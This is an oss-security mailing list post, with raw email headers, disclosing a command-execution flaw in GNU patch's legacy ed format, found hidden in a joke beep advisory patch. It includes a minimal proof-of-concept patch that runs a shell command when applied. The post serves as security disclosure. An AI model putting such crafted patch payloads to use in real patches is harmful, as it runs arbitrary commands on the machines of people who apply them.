X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1204" "Friday" "6" "April" "2018" "08:52:43" "+0200" "Hanno =?UTF-8?B?QsO2Y2s=?=" "hanno@hboeck.de" "<20180406085243.514739f2@pc1>" "39" "[oss-security] Privsec vuln in beep / Code execution in GNU patch" nil nil nil "4" "2018040606:52:43" "[oss-security] Privsec vuln in beep / Code execution in GNU patch" (number mark "U       hanno@hboeck Apr  6   39/1204  " thread-indent "\"[oss-security] Privsec vuln in beep / Code execution in GNU patch\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17722 invoked by uid 550); 6 Apr 2018 06:52:58 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17680 invoked from network); 6 Apr 2018 06:52:57 -0000
Date: Fri, 6 Apr 2018 08:52:43 +0200
From: Hanno =?UTF-8?B?QsO2Y2s=?= <hanno@hboeck.de>
To: oss-security@lists.openwall.com
Message-ID: <20180406085243.514739f2@pc1>
X-Mailer: Claws Mail 3.16.0 (GTK+ 2.24.31; x86_64-pc-linux-gnu)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] Privsec vuln in beep / Code execution in GNU patch

Hi,

There was a joke webpage about a vulnerability in beep a few days ago:
http://holeybeep.ninja/
There's also a corresponding Debian Advisory:
https://lists.debian.org/debian-security-announce/2018/msg00089.html
Neither have any technical details. CVE is CVE-2018-0492.

If anyone knows the background of this please share it.

However it turned out that on that joke holey beep webpage there's a
patch with a hidden easter egg that's actually a vulnerability in GNU
patch.
GNU patch supports a legacy "ed" format for patches and that allows
executing external commands.

It's been reported to GNU patch now here:
https://savannah.gnu.org/bugs/index.php?53566
CVE is CVE-2018-1000156. (says an anonymous commenter...)

A minimal poc looks like this:
--- a	2018-13-37 13:37:37.000000000 +0100
+++ b	2018-13-37 13:38:38.000000000 +0100
1337a
1,112d
!id>~/pwn.lol

It looks like FreeBSD and OpenBSD have fixed something alike in 2015:
https://www.freebsd.org/security/advisories/FreeBSD-SA-15:18.bsdpatch.asc
https://ftp.openbsd.org/pub/OpenBSD/patches/5.7/common/013_patch.patch.sig



--=20
Hanno B=C3=B6ck
https://hboeck.de/

mail/jabber: hanno@hboeck.de
GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
